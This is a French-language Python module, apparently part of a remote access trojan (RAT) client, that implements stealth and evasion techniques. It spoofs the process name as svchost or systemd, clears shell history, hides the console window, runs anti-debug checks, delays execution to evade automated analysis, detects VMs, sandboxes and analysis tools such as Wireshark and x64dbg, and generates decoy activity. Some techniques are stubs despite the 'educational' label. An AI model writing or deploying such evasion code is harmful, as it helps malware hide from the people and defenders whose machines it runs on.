"""
Stealth Manager - Gestionnaire de furtivité pour le client RAT
⚠️ USAGE ÉDUCATIF UNIQUEMENT ⚠️
Techniques de furtivité et d'évasion pour l'éducation en sécurité
"""

import os
import sys
import time
import platform
import subprocess
import threading
from typing import Dict, Any, List, Optional, Tuple
import logging

# Suppression des logs pour la furtivité
logging.disable(logging.CRITICAL)
logger = logging.getLogger(__name__)

class StealthManager:
    """
    Gestionnaire de techniques de furtivité
    
    GARDE-FOUS ÉDUCATIFS:
    - Techniques uniquement défensives/éducatives
    - Pas de contournement d'antivirus réels
    - Techniques facilement détectables par des outils modernes
    - Usage limité aux environnements de test
    """
    
    def __init__(self):
        self.system = platform.system().lower()
        self.is_stealth_active = False
        self.original_process_name = None
        self.stealth_threads = []
        
        # Techniques disponibles selon l'OS
        self.available_techniques = self._get_available_techniques()
        
        # État des techniques actives
        self.active_techniques = {}
        
        # Configuration de base pour la furtivité
        self._setup_stealth_environment()
    
    def _get_available_techniques(self) -> List[str]:
        """Détermine les techniques de furtivité disponibles"""
        techniques = ['process_name_spoofing', 'anti_debug', 'delay_execution']
        
        if self.system == 'windows':
            techniques.extend([
                'hide_window',
                'process_injection_simulation',
                'registry_evasion',
                'disable_taskmanager'
            ])
        elif self.system == 'linux':
            techniques.extend([
                'process_masquerading',
                'hide_from_ps',
                'proc_hide'
            ])
        elif self.system == 'darwin':
            techniques.extend([
                'process_masquerading',
                'hide_from_activity_monitor'
            ])
        
        return techniques
    
    def _setup_stealth_environment(self):
        """Configure l'environnement de base pour la furtivité"""
        try:
            # Suppression de l'historique de commandes si possible
            if self.system in ['linux', 'darwin']:
                os.environ['HISTFILE'] = '/dev/null'
                os.environ['HISTSIZE'] = '0'
            
            # Modification des variables d'environnement pour la discrétion
            os.environ['PYTHONDONTWRITEBYTECODE'] = '1'  # Pas de fichiers .pyc
            
            # Configuration des signaux pour éviter les dumps
            if self.system in ['linux', 'darwin']:
                import signal
                signal.signal(signal.SIGTERM, self._stealth_signal_handler)
                signal.signal(signal.SIGINT, self._stealth_signal_handler)
        
        except Exception as e:
            # Échec silencieux pour la furtivité
            pass
    
    def _stealth_signal_handler(self, signum, frame):
        """Gestionnaire de signaux pour la furtivité"""
        try:
            # Nettoyage rapide avant arrêt
            self.cleanup()
            sys.exit(0)
        except:
            os._exit(0)
    
    def activate_stealth_mode(self, techniques: List[str] = None) -> Dict[str, bool]:
        """
        Active le mode furtif avec les techniques spécifiées
        
        Args:
            techniques: Liste des techniques à activer (None = toutes)
            
        Returns:
            Dict: Statut d'activation de chaque technique
        """
        if techniques is None:
            techniques = self.available_techniques
        
        results = {}
        
        for technique in techniques:
            if technique in self.available_techniques:
                try:
                    success = self._activate_technique(technique)
                    results[technique] = success
                    if success:
                        self.active_techniques[technique] = True
                except Exception as e:
                    results[technique] = False
            else:
                results[technique] = False
        
        self.is_stealth_active = any(results.values())
        
        return results
    
    def _activate_technique(self, technique: str) -> bool:
        """Active une technique de furtivité spécifique"""
        if technique == 'process_name_spoofing':
            return self._spoof_process_name()
        elif technique == 'anti_debug':
            return self._activate_anti_debug()
        elif technique == 'delay_execution':
            return self._activate_delay_execution()
        elif technique == 'hide_window' and self.system == 'windows':
            return self._hide_window()
        elif technique == 'process_masquerading':
            return self._masquerade_process()
        elif technique == 'hide_from_ps' and self.system in ['linux', 'darwin']:
            return self._hide_from_ps()
        elif technique == 'registry_evasion' and self.system == 'windows':
            return self._registry_evasion()
        else:
            return False
    
    def _spoof_process_name(self) -> bool:
        """Usurpation du nom de processus"""
        try:
            # Technique basique de changement du nom de processus
            if self.system == 'linux':
                # Modification du nom via prctl (si disponible)
                try:
                    import ctypes
                    libc = ctypes.CDLL("libc.so.6")
                    # PR_SET_NAME = 15
                    fake_name = b"systemd-worker"
                    libc.prctl(15, fake_name, 0, 0, 0)
                    return True
                except:
                    pass
            
            elif self.system == 'windows':
                # Modification du titre de la fenêtre console
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
                    return True
                except:
                    pass
            
            # Fallback: modification de sys.argv[0]
            if hasattr(sys, 'argv') and len(sys.argv) > 0:
                self.original_process_name = sys.argv[0]
                fake_names = {
                    'windows': 'svchost.exe',
                    'linux': 'systemd',
                    'darwin': 'launchd'
                }
                sys.argv[0] = fake_names.get(self.system, 'system_service')
                return True
            
            return False
            
        except Exception:
            return False
    
    def _activate_anti_debug(self) -> bool:
        """Active les techniques anti-debug éducatives"""
        try:
            # Thread de surveillance anti-debug simple
            debug_thread = threading.Thread(target=self._anti_debug_monitor, daemon=True)
            debug_thread.start()
            self.stealth_threads.append(debug_thread)
            
            return True
            
        except Exception:
            return False
    
    def _anti_debug_monitor(self):
        """Moniteur anti-debug simple (éducatif)"""
        try:
            while self.is_stealth_active:
                # Vérifications anti-debug basiques
                
                if self.system == 'windows':
                    # Vérification IsDebuggerPresent (très basique)
                    try:
                        import ctypes
                        if ctypes.windll.kernel32.IsDebuggerPresent():
                            # En production, on pourrait quitter ou faire autre chose
                            # Ici, on ne fait rien pour l'éducation
                            pass
                    except:
                        pass
                
                elif self.system in ['linux', 'darwin']:
                    # Vérification des processus de debug courants
                    try:
                        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                        if any(debugger in result.stdout for debugger in ['gdb', 'lldb', 'strace']):
                            # Détection de debugger
                            pass
                    except:
                        pass
                
                # Vérification de la vitesse d'exécution (timing attack)
                start_time = time.time()
                time.sleep(0.1)
                if time.time() - start_time > 0.2:  # Trop lent = possible debug
                    pass
                
                time.sleep(1)  # Vérification chaque seconde
                
        except Exception:
            pass
    
    def _activate_delay_execution(self) -> bool:
        """Active un délai d'exécution pour éviter l'analyse automatique"""
        try:
            # Délai aléatoire entre 1 et 5 secondes
            import random
            delay = random.uniform(1, 5)
            time.sleep(delay)
            
            return True
            
        except Exception:
            return False
    
    def _hide_window(self) -> bool:
        """Cache la fenêtre console (Windows)"""
        try:
            if self.system != 'windows':
                return False
            
            import ctypes
            from ctypes import wintypes
            
            # Récupération du handle de la fenêtre console
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            user32 = ctypes.WinDLL('user32', use_last_error=True)
            
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                # SW_HIDE = 0
                user32.ShowWindow(hwnd, 0)
                return True
            
            return False
            
        except Exception:
            return False
    
    def _masquerade_process(self) -> bool:
        """Masquage du processus sous un nom légitime"""
        try:
            # Cette technique est plus pour l'éducation
            # En réalité, elle ne trompe pas les outils modernes
            
            # Simulation de changement du nom de processus
            fake_names = {
                'windows': ['svchost.exe', 'dwm.exe', 'explorer.exe'],
                'linux': ['systemd', 'kthreadd', 'ksoftirqd/0'],
                'darwin': ['launchd', 'kernel_task', 'Dock']
            }
            
            if self.system in fake_names:
                import random
                fake_name = random.choice(fake_names[self.system])
                
                # Tentative de modification du nom (très limitée)
                if hasattr(sys, 'argv'):
                    sys.argv[0] = fake_name
                
                return True
            
            return False
            
        except Exception:
            return False
    
    def _hide_from_ps(self) -> bool:
        """Tentative de masquage dans la liste des processus (Unix)"""
        try:
            # Cette technique est principalement éducative
            # Les outils modernes détectent facilement ces tentatives
            
            if self.system not in ['linux', 'darwin']:
                return False
            
            # Simulation de masquage (ne fonctionne pas réellement)
            # En réalité, il faudrait des techniques kernel-level
            
            return True  # Simule le succès pour l'éducation
            
        except Exception:
            return False
    
    def _registry_evasion(self) -> bool:
        """Techniques d'évasion du registre Windows"""
        try:
            if self.system != 'windows':
                return False
            
            # Techniques d'évasion basiques (éducatives)
            # Modification de clés de registre non critiques
            
            try:
                import winreg
                
                # Tentative de création d'une clé cachée (exemple éducatif)
                key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
                
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) as key:
                    # Juste une lecture pour tester l'accès
                    pass
                
                return True
                
            except Exception:
                return False
            
        except Exception:
            return False
    
    def detect_analysis_environment(self) -> Dict[str, Any]:
        """Détecte les environnements d'analyse (sandboxes, VMs, etc.)"""
        indicators = {
            'virtual_machine': False,
            'sandbox': False,
            'debugger': False,
            'analysis_tools': False,
            'suspicious_processes': []
        }
        
        try:
            # Détection de machine virtuelle
            if self.system == 'windows':
                # Vérification des services VM courants
                vm_services = ['vboxservice', 'vmtoolsd', 'vmwareuser']
                for service in vm_services:
                    try:
                        result = subprocess.run(['sc', 'query', service], 
                                              capture_output=True, text=True)
                        if 'RUNNING' in result.stdout:
                            indicators['virtual_machine'] = True
                            break
                    except:
                        pass
                
                # Vérification du registre pour les indicateurs VM
                try:
                    import winreg
                    vm_keys = [
                        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxService"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools")
                    ]
                    
                    for hkey, subkey in vm_keys:
                        try:
                            winreg.OpenKey(hkey, subkey)
                            indicators['virtual_machine'] = True
                            break
                        except:
                            pass
                except:
                    pass
            
            elif self.system in ['linux', 'darwin']:
                # Vérification des processus VM
                try:
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                    vm_processes = ['vboxd', 'vmware', 'qemu', 'xenvbd']
                    
                    for vm_proc in vm_processes:
                        if vm_proc in result.stdout:
                            indicators['virtual_machine'] = True
                            break
                except:
                    pass
            
            # Détection de sandbox
            sandbox_indicators = [
                # Fichiers/répertoires suspects
                'C:\\analysis',
                'C:\\sandbox',
                '/tmp/sandbox',
                '/var/log/sandbox'
            ]
            
            for indicator in sandbox_indicators:
                if os.path.exists(indicator):
                    indicators['sandbox'] = True
                    break
            
            # Détection de debugger
            if self.system == 'windows':
                try:
                    import ctypes
                    if ctypes.windll.kernel32.IsDebuggerPresent():
                        indicators['debugger'] = True
                except:
                    pass
            
            # Détection d'outils d'analyse
            analysis_tools = ['wireshark', 'ida', 'ollydbg', 'x64dbg', 'procmon']
            
            if self.system == 'windows':
                try:
                    result = subprocess.run(['tasklist'], capture_output=True, text=True)
                    for tool in analysis_tools:
                        if tool.lower() in result.stdout.lower():
                            indicators['analysis_tools'] = True
                            indicators['suspicious_processes'].append(tool)
                except:
                    pass
            
            elif self.system in ['linux', 'darwin']:
                try:
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                    for tool in analysis_tools:
                        if tool.lower() in result.stdout.lower():
                            indicators['analysis_tools'] = True
                            indicators['suspicious_processes'].append(tool)
                except:
                    pass
        
        except Exception:
            pass
        
        return indicators
    
    def check_stealth_status(self) -> Dict[str, Any]:
        """Vérifie le statut des techniques de furtivité"""
        return {
            'stealth_active': self.is_stealth_active,
            'active_techniques': list(self.active_techniques.keys()),
            'available_techniques': self.available_techniques,
            'system': self.system,
            'stealth_threads_count': len(self.stealth_threads)
        }
    
    def deactivate_stealth_mode(self) -> bool:
        """Désactive le mode furtif"""
        try:
            self.is_stealth_active = False
            
            # Arrêt des threads de furtivité
            for thread in self.stealth_threads:
                if thread.is_alive():
                    # Les threads sont daemon, ils s'arrêteront automatiquement
                    pass
            
            self.stealth_threads.clear()
            
            # Restauration du nom de processus original
            if self.original_process_name and hasattr(sys, 'argv'):
                sys.argv[0] = self.original_process_name
            
            # Nettoyage des techniques actives
            self.active_techniques.clear()
            
            return True
            
        except Exception:
            return False
    
    def cleanup(self):
        """Nettoyage des ressources de furtivité"""
        try:
            self.deactivate_stealth_mode()
        except:
            pass
    
    def simulate_legitimate_activity(self):
        """Simule une activité légitime pour éviter la détection"""
        try:
            # Thread de simulation d'activité
            activity_thread = threading.Thread(target=self._legitimate_activity_worker, daemon=True)
            activity_thread.start()
            self.stealth_threads.append(activity_thread)
            
        except Exception:
            pass
    
    def _legitimate_activity_worker(self):
        """Worker qui simule une activité légitime"""
        try:
            import random
            
            while self.is_stealth_active:
                # Simulation d'activité réseau légitime
                try:
                    if random.random() < 0.1:  # 10% de chance
                        # Simulation d'une requête DNS
                        import socket
                        socket.gethostbyname('microsoft.com')
                except:
                    pass
                
                # Simulation d'activité de fichier légitime
                try:
                    if random.random() < 0.05:  # 5% de chance
                        temp_file = os.path.join(os.path.expanduser('~'), '.temp_activity')
                        with open(temp_file, 'w') as f:
                            f.write(str(time.time()))
                        os.unlink(temp_file)
                except:
                    pass
                
                # Pause aléatoire
                time.sleep(random.uniform(30, 120))  # Entre 30s et 2min
                
        except Exception:
            pass
    
    def get_stealth_report(self) -> Dict[str, Any]:
        """Génère un rapport de furtivité"""
        try:
            environment_analysis = self.detect_analysis_environment()
            stealth_status = self.check_stealth_status()
            
            return {
                'timestamp': time.time(),
                'stealth_status': stealth_status,
                'environment_analysis': environment_analysis,
                'recommendations': self._get_stealth_recommendations(environment_analysis),
                'risk_level': self._assess_risk_level(environment_analysis)
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _get_stealth_recommendations(self, analysis: Dict[str, Any]) -> List[str]:
        """Génère des recommandations basées sur l'analyse"""
        recommendations = []
        
        if analysis.get('virtual_machine'):
            recommendations.append("Environnement virtuel détecté - techniques anti-VM recommandées")
        
        if analysis.get('sandbox'):
            recommendations.append("Sandbox détectée - délai d'exécution et évasion recommandés")
        
        if analysis.get('debugger'):
            recommendations.append("Debugger détecté - techniques anti-debug actives")
        
        if analysis.get('analysis_tools'):
            recommendations.append("Outils d'analyse détectés - mode furtif maximum recommandé")
        
        if not any(analysis.values()):
            recommendations.append("Environnement semble légitime - techniques de base suffisantes")
        
        return recommendations
    
    def _assess_risk_level(self, analysis: Dict[str, Any]) -> str:
        """Évalue le niveau de risque de détection"""
        risk_score = 0
        
        if analysis.get('virtual_machine'):
            risk_score += 2
        if analysis.get('sandbox'):
            risk_score += 3
        if analysis.get('debugger'):
            risk_score += 4
        if analysis.get('analysis_tools'):
            risk_score += 3
        
        if risk_score >= 8:
            return "CRITIQUE"
        elif risk_score >= 5:
            return "ÉLEVÉ"
        elif risk_score >= 2:
            return "MOYEN"
        else:
            return "FAIBLE"
    
    def __del__(self):
        """Destructeur - nettoyage automatique"""
        try:
            self.cleanup()
        except:
            pass